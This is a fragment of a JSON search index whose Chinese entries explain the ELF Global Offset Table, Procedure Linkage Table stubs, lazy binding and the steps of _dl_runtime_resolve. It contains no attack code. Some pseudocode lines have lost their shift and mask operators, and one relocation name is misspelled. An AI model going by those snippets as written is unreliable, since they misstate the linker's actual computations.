            "text": "GOT \u8868\u5728 ELF \u6587\u4ef6\u4e2d\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206   .got\uff0c\u5b58\u50a8\u5168\u5c40\u53d8\u91cf\u7684\u5f15\u7528\u3002  .got.plt\uff0c\u5b58\u50a8\u51fd\u6570\u7684\u5f15\u7528\u3002   \u5176\u76f8\u5e94\u7684\u503c\u7531\u80fd\u591f\u89e3\u6790.rel.plt \u6bb5\u4e2d\u7684\u91cd\u5b9a\u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u5668\u6765\u586b\u5199\u3002  \u901a\u5e38\u6765\u8bf4\uff0c\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u4e0d\u80fd\u5305\u542b\u7edd\u5bf9\u865a\u62df\u5730\u5740\u3002GOT\u8868\u4e2d\u5305\u542b\u4e86\u9690\u85cf\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u8fd9\u4f7f\u5f97\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u65e0\u5173\u6027\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5f97\u5230\u76f8\u5173\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u4f4d\u7f6e\u72ec\u7acb\u4ee3\u7801\u6765\u5f15\u7528\u5b83\u7684GOT\u8868\uff0c\u7136\u540e\u63d0\u53d6\u51fa\u6765\u7edd\u5bf9\u7684\u6570\u503c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5f15\u7528\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u7684\u5730\u5740\u3002 \u8fd9\u4e2a\u8868\u5bf9\u4e8e System V \u73af\u5883\u4e2d\u7684\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\u662f\u5fc5\u8981\u7684\uff0c\u4f46\u5176\u5177\u4f53\u7684\u5185\u5bb9\u4ee5\u53ca\u5f62\u5f0f\u4f9d\u8d56\u4e8e\u5904\u7406\u5668\u3002  \u521d\u59cb\u65f6\uff0cgot \u8868\u4e2d\u5305\u542b\u91cd\u5b9a\u5411\u5165\u53e3\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5f53\u4e00\u4e2a\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5904\u7406\u91cd\u5b9a\u4f4d\u9879\uff0c\u5176\u4e2d\u7684\u4e00\u4e9b\u9879\u7684\u7c7b\u578b\u53ef\u80fd\u662f R_386_GLOB_DAT\uff0c\u8fd9\u4f1a\u6307\u5411 got \u8868\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76f8\u5173\u7684\u7b26\u53f7\u7684\u503c\uff0c\u8ba1\u7b97\u5b83\u4eec\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u7136\u540e\u5c06\u5408\u9002\u7684\u5185\u5b58\u8868\u9879\u8bbe\u7f6e\u4e3a\u76f8\u5e94\u7684\u503c\u3002\u5c3d\u7ba1\u5728\u94fe\u63a5\u5668\u5efa\u7acb\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u7edd\u5bf9\u5730\u5740\u8fd8\u5904\u4e8e\u672a\u77e5\u72b6\u6001\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u77e5\u9053\u6240\u6709\u5185\u5b58\u6bb5\u7684\u5730\u5740\uff0c\u56e0\u4e3a\u53ef\u4ee5\u8ba1\u7b97\u6240\u5305\u542b\u7684\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002  \u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u9700\u8981\u76f4\u63a5\u8bbf\u95ee\u4e00\u4e2a\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b26\u53f7\u5c06\u4f1a\u6709\u4e00\u4e2a got \u8868\u9879\u3002\u7531\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u5355\u72ec\u7684\u8868\u9879\uff0c\u6240\u4ee5\u4e00\u4e2a\u7b26\u53f7\u7684\u5730\u5740\u53ef\u80fd\u4f1a\u51fa\u73b0\u5728\u591a\u4e2a\u8868\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5728\u628a\u6743\u9650\u7ed9\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4ee3\u7801\u6bb5\u524d\uff0c\u4f1a\u5904\u7406\u6240\u6709\u7684 got \u8868\u4e2d\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ee5\u4fbf\u4e8e\u786e\u5b9a\u6240\u6709\u7684\u7edd\u5bf9\u5730\u5740\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002  GOT \u8868\u4e2d\u7684\u7b2c 0 \u9879\u5305\u542b\u52a8\u6001\u7ed3\u6784\u7684\u5730\u5740\uff0c\u7528\u7b26\u53f7 _DYNAMIC \u6765\u8fdb\u884c\u5f15\u7528\u3002\u8fd9\u4f7f\u5f97\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u4f8b\u5982\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u5728\u6ca1\u6709\u6267\u884c\u5176\u91cd\u5b9a\u5411\u524d\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u52a8\u6001\u7ed3\u6784\u3002\u8fd9\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u5668\u6765\u8bf4\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u5728\u4e0d\u4f9d\u8d56\u5176\u5b83\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u91cd\u5b9a\u4f4d\u81ea\u5df1\u7684\u5185\u5b58\u955c\u50cf\u3002  \u5728\u4e0d\u540c\u7684\u7a0b\u5e8f\u4e2d\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u4e3a\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u9009\u62e9\u4e0d\u540c\u7684\u5185\u5b58\u6bb5\u5730\u5740\uff1b\u751a\u81f3\u5bf9\u4e8e\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5728\u4e0d\u540c\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u5e93\u5730\u5740\u3002\u7136\u800c\uff0c\u4e00\u65e6\u8fdb\u7a0b\u955c\u50cf\u88ab\u5efa\u7acb\uff0c\u5185\u5b58\u6bb5\u7684\u5730\u5740\u5c31\u4e0d\u4f1a\u518d\u6539\u53d8\uff0c\u53ea\u8981\u4e00\u4e2a\u8fdb\u7a0b\u8fd8\u5b58\u5728\uff0c\u5b83\u7684\u5185\u5b58\u6bb5\u5730\u5740\u5c06\u5904\u4e8e\u56fa\u5b9a\u7684\u4f4d\u7f6e\u3002  GOT \u8868\u7684\u5f62\u5f0f\u4ee5\u53ca\u89e3\u91ca\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\uff0c\u5bf9\u4e8e Intel \u67b6\u6784\u6765\u8bf4\uff0c _GLOBAL_OFFSET_TABLE_  \u7b26\u53f7\u53ef\u80fd\u88ab\u7528\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002  extern Elf32_Addr _GLOBAL_OFFSET_TABLE[];  GLOBAL_OFFSET_TABLE  \u53ef\u80fd\u4f1a\u5728 .got \u8282\u7684\u4e2d\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4f7f\u7528\u6b63\u8d1f\u7d22\u5f15\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002  \u5728 Linux \u7684\u5b9e\u73b0\u4e2d\uff0c.got.plt \u7684\u524d\u4e09\u9879\u7684\u5177\u4f53\u7684\u542b\u4e49\u5982\u4e0b   GOT[0]\uff0c.dynamic \u7684\u5730\u5740\u3002  GOT[1]\uff0c\u6307\u5411\u5185\u90e8\u7c7b\u578b\u4e3a link_map \u7684\u6307\u9488\uff0c\u53ea\u4f1a\u5728\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d\u4f7f\u7528\uff0c\u5305\u542b\u4e86\u8fdb\u884c\u7b26\u53f7\u89e3\u6790\u9700\u8981\u7684\u5f53\u524d ELF\u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u6bcf\u4e2a link_map \u90fd\u662f\u4e00\u6761\u53cc\u5411\u94fe\u8868\u7684\u4e00\u4e2a\u8282\u70b9\uff0c\u800c\u8fd9\u4e2a\u94fe\u8868\u4fdd\u5b58\u4e86\u6240\u6709\u52a0\u8f7d\u7684 ELF \u5bf9\u8c61\u7684\u4fe1\u606f\u3002  GOT[2]\uff0c\u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d _dl_runtime_resolve \u51fd\u6570\u7684\u6307\u9488\u3002   .got.plt \u540e\u9762\u7684\u9879\u5219\u662f\u7a0b\u5e8f\u4e2d\u4e0d\u540c .so \u4e2d\u51fd\u6570\u7684\u5f15\u7528\u5730\u5740\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u76f8\u5e94\u7684\u5173\u7cfb\u3002", 
            "title": "Global Offset Table"
        }, 
        {
            "location": "/executable/elf/elf_structure/#procedure-linkage-table", 
            "text": "GOT \u8868\u7528\u6765\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5730\u5740\u91cd\u5b9a\u5411\u4e3a\u7edd\u5bf9\u5730\u5740\uff0c\u4e0e\u6b64\u7c7b\u4f3c\uff0cPLT\u8868\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u51fd\u6570\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u5730\u5740\u3002\u4e3b\u8981\u5305\u62ec\u4e24\u90e8\u5206   .plt \uff0c\u4e0e\u5e38\u89c1\u5bfc\u5165\u7684\u51fd\u6570\u6709\u5173\uff0c\u5982 read \u7b49\u51fd\u6570\u3002  .plt.got \uff0c\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u7cfb\u3002   \u5728\u52a8\u6001\u94fe\u63a5\u4e0b\uff0c\u7a0b\u5e8f\u6a21\u5757\u4e4b\u95f4\u5305\u542b\u4e86\u5927\u91cf\u7684\u51fd\u6570\u5f15\u7528\uff0c\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u52a8\u6001\u94fe\u63a5\u4f1a\u8017\u8d39\u4e0d\u5c11\u65f6\u95f4\u7528\u4e8e\u89e3\u51b3\u6a21\u5757\u4e4b\u95f4\u7684\u51fd\u6570\u5f15\u7528\u7684\u7b26\u53f7\u67e5\u627e\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002\u4f46\u662f\uff0c\u5728\u4e00\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u5f88\u591a\u51fd\u6570\u5728\u7a0b\u5e8f\u6267\u884c\u5b8c\u65f6\u90fd\u4e0d\u4f1a\u7528\u5230\uff0c\u56e0\u6b64\u4e00\u5f00\u59cb\u5c31\u628a\u6240\u6709\u51fd\u6570\u90fd\u94fe\u63a5\u597d\u662f\u4e00\u79cd\u6d6a\u8d39\uff0c\u6240\u4ee5 ELF \u91c7\u7528\u4e86\u4e00\u79cd\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u505a\u6cd5\uff0c\u5176\u57fa\u672c\u601d\u60f3\u662f\u51fd\u6570\u7b2c\u4e00\u6b21\u88ab\u7528\u5230\u65f6\u624d\u8fdb\u884c\u7ed1\u5b9a\uff08\u7b26\u53f7\u67e5\u627e\uff0c\u91cd\u5b9a\u4f4d\u7b49\uff09\uff0c\u5982\u679c\u6ca1\u6709\u7528\u5219\u4e0d\u8fdb\u884c\u7ed1\u5b9a\u3002\u6240\u4ee5\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u6a21\u5757\u95f4\u7684\u51fd\u6570\u8c03\u7528\u90fd\u6ca1\u6709\u8fdb\u884c\u7ed1\u5b9a\uff0c\u800c\u662f\u9700\u8981\u7528\u5230\u65f6\u624d\u7531\u52a8\u6001\u94fe\u63a5\u5668\u8d1f\u8d23\u7ed1\u5b9a\u3002  \u94fe\u63a5\u7f16\u8f91\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u6267\u884c\u6d41\u8f6c\u6362\uff08\u6bd4\u5982\u7a0b\u5e8f\u8c03\u7528\uff09\uff0c\u5373\u4ece\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u3002\u94fe\u63a5\u5668\u5b89\u6392\u7a0b\u5e8f\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u8868\u9879\u3002\u5728 Intel \u67b6\u6784\u4e2d\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u5b58\u5728\u4e8e\u5171\u4eab\u4ee3\u7801\u6bb5\u4e2d\uff0c\u4f46\u662f\u4ed6\u4eec\u4f1a\u4f7f\u7528\u5728 GOT \u8868\u4e2d\u7684\u6570\u636e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76ee\u6807\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u5e76\u4e14\u4f1a\u4fee\u6539\u76f8\u5e94\u7684 GOT \u8868\u4e2d\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u72ec\u7acb\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u91cd\u5b9a\u5411 PLT \u9879\u3002\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\u3002  \u7edd\u5bf9\u5730\u5740\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u5982\u4e0b  .PLT0:pushl got_plus_4\n      jmp   *got_plus_8\n      nop; nop\n      nop; nop\n.PLT1:jmp   *name1_in_GOT\n      pushl $offset@PC\n      jmp   .PLT0@PC\n.PLT2:jmp   *name2_in_GOT\n      push  $offset\n      jmp   .PLT0@PC\n      ...  \u4f4d\u7f6e\u65e0\u5173\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\u5982\u4e0b  .PLT0:pushl 4(%ebx)\n      jmp   *8(%ebx)\n      nop; nop\n      nop; nop\n.PLT1:jmp   *name1_in_GOT(%ebx)\n      pushl $offset\n      jmp   .PLT0@PC\n.PLT2:jmp   *name2_in_GOT(%ebx)\n      push  $offset\n      jmp   .PLT0@PC\n      ...  \u53ef\u4ee5\u770b\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9488\u5bf9\u4e8e\u7edd\u5bf9\u5730\u5740\u4ee5\u53ca\u4f4d\u7f6e\u72ec\u7acb\u7684\u4ee3\u7801\u7684\u5904\u7406\u4e0d\u540c\u3002\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u5b83\u4eec\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u63a5\u53e3\u662f\u4e00\u6837\u7684\u3002  \u52a8\u6001\u94fe\u63a5\u5668\u548c\u7a0b\u5e8f\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u548c\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b26\u53f7\u5f15\u7528\u3002   \u5f53\u7b2c\u4e00\u6b21\u5efa\u7acb\u7a0b\u5e8f\u7684\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u9879\u8bbe\u7f6e\u4e3a\u7279\u6b8a\u7684\u503c\uff0c\u4e0b\u9762\u7684\u6b65\u9aa4\u4f1a\u4ed4\u7ec6\u89e3\u91ca\u8fd9\u4e9b\u6570\u503c\u3002  \u5982\u679c\u8fc7\u7a0b\u94fe\u63a5\u8868\u662f\u4f4d\u7f6e\u72ec\u7acb\u7684\u8bdd\uff0c\u90a3\u4e48 GOT \u8868\u7684\u5730\u5740\u5fc5\u987b\u5728 ebx \u5bc4\u5b58\u5668\u4e2d\u3002\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\uff0c\u5e76\u4e14\u7a0b\u5e8f\u53ea\u5728\u540c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9 PLT \u8868\u9879\u3002\u56e0\u6b64\uff0c\u8c03\u7528\u51fd\u6570\u8d1f\u8d23\u5728\u8c03\u7528 PLT\u8868\u9879\u4e4b\u524d\uff0c\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u57fa\u5730\u5740\u8bbe\u7f6e\u4e3a\u5bc4\u5b58\u5668\u4e2d\u3002  \u8fd9\u91cc\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u7a0b\u5e8f\u8c03\u7528\u4e86name1\uff0c\u5b83\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u4e86 lable .PLT1\u3002  \u90a3\u4e48\uff0c\u7b2c\u4e00\u6761\u6307\u4ee4\u5c06\u4f1a\u8df3\u8f6c\u5230\u5168\u5c40\u504f\u79fb\u8868\u4e2d name1\u7684\u5730\u5740\u3002\u521d\u59cb\u65f6\uff0c\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u5305\u542b PLT \u4e2d\u4e0b\u4e00\u6761 pushl\u6307\u4ee4\u7684\u5730\u5740\uff0c\u5e76\u4e0d\u662f name1\u7684\u5b9e\u9645\u5730\u5740\u3002  \u56e0\u6b64\uff0c\u7a0b\u5e8f\u5c06\u4e00\u4e2a\u91cd\u5b9a\u5411\u504f\u79fb\uff08reloc_index\uff09\u538b\u5230\u6808\u4e0a\u3002\u91cd\u5b9a\u4f4d\u504f\u79fb\u662f 32 \u4f4d\u7684\uff0c\u5e76\u4e14\u662f\u975e\u8d1f\u7684\u6570\u503c\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u7c7b\u578b\u4e3a R_386_JMP_SLOT\uff0c\u5e76\u4e14\u5b83\u5c06\u4f1a\u8bf4\u660e\u5728\u4e4b\u524d jmp \u6307\u4ee4\u4e2d\u4f7f\u7528\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u5728 GOT \u8868\u4e2d\u7684\u504f\u79fb\u3002\u91cd\u5b9a\u4f4d\u8868\u9879\u4e5f\u5305\u542b\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u56e0\u6b64\u544a\u8bc9\u52a8\u6001\u94fe\u63a5\u5668\u4ec0\u4e48\u7b26\u53f7\u76ee\u524d\u6b63\u5728\u88ab\u5f15\u7528\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f name1\u4e86\u3002  \u5728\u538b\u5165\u91cd\u5b9a\u4f4d\u504f\u79fb\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230 .PLT0\uff0c\u8fd9\u662f\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u7b2c\u4e00\u4e2a\u8868\u9879\u3002pushl \u6307\u4ee4\u5c06 GOT \u8868\u7684\u7b2c\u4e8c\u4e2a\u8868\u9879(got_plus_4 \u6216\u80054(%ebx)\uff0c \u5f53\u524dELF\u5bf9\u8c61\u7684\u4fe1\u606f )\u538b\u5230\u6808\u4e0a\uff0c\u7136\u540e\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u8bc6\u522b\u4fe1\u606f\u3002\u6b64\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230\u7b2c\u4e09\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u9879(got_plus_8 \u6216\u80058(%ebx)\uff0c \u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d_dl_runtime_resolve\u51fd\u6570\u7684\u6307\u9488 ) \u5904\uff0c\u8fd9\u5c06\u4f1a\u5c06\u7a0b\u5e8f\u6d41\u4ea4\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u3002  \u5f53\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u6536\u5230\u63a7\u5236\u6743\u540e\uff0c\u4ed6\u5c06\u4f1a\u8fdb\u884c\u51fa\u6808\u64cd\u4f5c\uff0c\u67e5\u770b\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u7684\u503c\uff0c\u5c06 name1 \u7684\u5730\u5740\u5b58\u50a8\u5728\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e2d\uff0c\u7136\u540e\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u76ee\u7684\u5730\u5740\u3002  \u8fc7\u7a0b\u94fe\u63a5\u8868\u6267\u884c\u4e4b\u540e\uff0c\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u5c06\u4f1a\u76f4\u63a5\u4ea4\u7ed9 name1 \u51fd\u6570\uff0c\u800c\u4e14\u6b64\u540e\u518d\u4e5f\u4e0d\u4f1a\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u5668\u6765\u89e3\u6790\u8fd9\u4e2a\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 .PLT1 \u5904\u7684 jmp \u6307\u4ee4\u5c06\u4f1a\u76f4\u63a5\u8df3\u8f6c\u5230 name1 \u5904\uff0c\u800c\u4e0d\u662f\u518d\u6b21\u6267\u884c pushl \u6307\u4ee4\u3002   \u603b\u4f53\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u84dd\u7ebf\u8868\u793a\u9996\u6b21\u6267\u884c\u7684\u6d41\u7a0b\u56fe\uff0c\u7ea2\u7ebf\u8868\u793a\u7b2c\u4e8c\u6b21\u4ee5\u540e\u8c03\u7528\u7684\u6d41\u7a0b\u56fe\uff1a   LD_BIND_NOW \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u884c\u4e3a\u3002\u5982\u679c\u5b83\u7684\u503c\u975e\u7a7a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u7a0b\u5e8f\u4e4b\u524d\u4f1a\u6267\u884c PLT \u8868\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\u6267\u884c\u7c7b\u578b\u4e3a R_3862_JMP_SLOT \u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002\u5426\u5219\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u8868\u4f1a\u5bf9\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u8fdb\u884c\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u76f4\u5230\u7b2c\u4e00\u6b21\u6267\u884c\u5bf9\u5e94\u7684\u8868\u9879\u65f6\uff0c\u624d\u4f1a\u4eca\u6b21\u90a3\u4e2a\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002  \u6ce8\u610f   \u60f0\u6027\u7ed1\u5b9a\u901a\u5e38\u6765\u8bf4\u4f1a\u63d0\u9ad8\u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\uff0c\u56e0\u4e3a\u6ca1\u6709\u4f7f\u7528\u7684\u7b26\u53f7\u5e76\u4e0d\u4f1a\u589e\u52a0\u52a8\u6001\u94fe\u63a5\u7684\u8d1f\u8f7d\u3002\u7136\u800c\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\u5c06\u4f1a\u4f7f\u5f97\u60f0\u6027\u7ed1\u5b9a\u51fa\u73b0\u672a\u9884\u671f\u7684\u60c5\u51b5\u3002\u9996\u5148\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u51fd\u6570\u7684\u521d\u59cb\u5f15\u7528\u4e00\u822c\u6765\u8bf4\u4f1a\u8d85\u8fc7\u540e\u7eed\u8c03\u7528\u7684\u65f6\u95f4\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u9700\u8981\u62e6\u622a\u8c03\u7528\u4ee5\u4fbf\u4e8e\u53bb\u89e3\u6790\u7b26\u53f7\u3002\u4e00\u4e9b\u5e94\u7528\u5e76\u4e0d\u80fd\u591f\u5fcd\u53d7\u8fd9\u79cd\u4e0d\u53ef\u9884\u6d4b\u6027\u3002\u5176\u6b21\uff0c\u5982\u679c\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5e76\u4e14\u52a8\u6001\u94fe\u63a5\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u7b26\u53f7\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u7ec8\u6b62\u7a0b\u5e8f\u3002\u5728\u60f0\u6027\u7ed1\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u968f\u65f6\u53d1\u751f\u3002\u5f53\u5173\u95ed\u4e86\u60f0\u6027\u7ed1\u5b9a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u5c31\u4e0d\u4f1a\u51fa\u73b0\u76f8\u5e94\u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u90fd\u662f\u5728\u5e94\u7528\u83b7\u5f97\u63a7\u5236\u6743\u4e4b\u524d\u6267\u884c\u7684\u3002   \u5728 Linux \u7684\u8bbe\u8ba1\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u4e4b\u540e\u7684 PLT \u6761\u76ee\u8fdb\u884c\u4e86\u5982\u4e0b\u7684\u51fd\u6570\u8c03\u7528  _dl_runtime_resolve ( link_map_obj ,   reloc_index )   \u8fd9\u91cc\u4ee5 32 \u4f4d\u4e3a\u4f8b\uff0864\u4f4d\u7c7b\u4f3c\uff09\uff0c\u5177\u4f53\u7684\u8fc7\u7a0b\u5982\u4e0b   \u6839\u636e reloc_index \u8ba1\u7b97\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff1a Elf32_Rel *reloc = JMPREL + index    \u6839\u636e\u5f97\u5230\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\uff1a (reloc- r_info) 8  \u7ee7\u800c\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\uff1a Elf32_Sym *sym =  SYMTAB[((reloc- r_info) 8)]  \u5224\u65ad\u7b26\u53f7\u7684\u7c7b\u578b\u662f\u5426\u4e3a R_386_JMP_SLOT\uff1a assert (((reloc- r_info) 0xff) == 0x7 )  if ((ELFW(ST_VISIBILITY) (sym- st_other), 0) == 0)  if (sym- st_other)   3 == 0 )  \u5224\u65ad\u8be5\u7b26\u53f7\u662f\u5426\u5df2\u7ecf\u89e3\u6790\u8fc7\u4e86\uff0c\u5982\u679c\u89e3\u6790\u8fc7\uff0c\u5c31\u4e0d\u4f1a\u518d\u53bb\u6267\u884c lookup \u64cd\u4f5c\u3002    \u5f97\u5230\u7b26\u53f7\u7684\u7248\u672c\uff0c\u5982\u679c ndx \u4e3a 0 \u7684\u8bdd\uff0c\u4f1a\u76f4\u63a5\u4f7f\u7528 local symbol\u3002  uint16_t ndx = VERSYM[ (reloc- r_info)   8]  r_found_version *version =  l- l_version[ndx]    \u6839\u636e name \u6765\u5bfb\u627e\u76f8\u5e94\u51fd\u6570\u5728\u5e93\u4e2d\u7684\u5730\u5740\u3002  name = STRTAB + sym- st_name", 
            "title": "Procedure Linkage Table"
        }, 
        {
            "location": "/executable/elf/elf_structure/#eh_frame-related", 
            "text": ".eh_frame_hdr  .eh_frame", 
            "title": ".eh_frame related"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_19", 
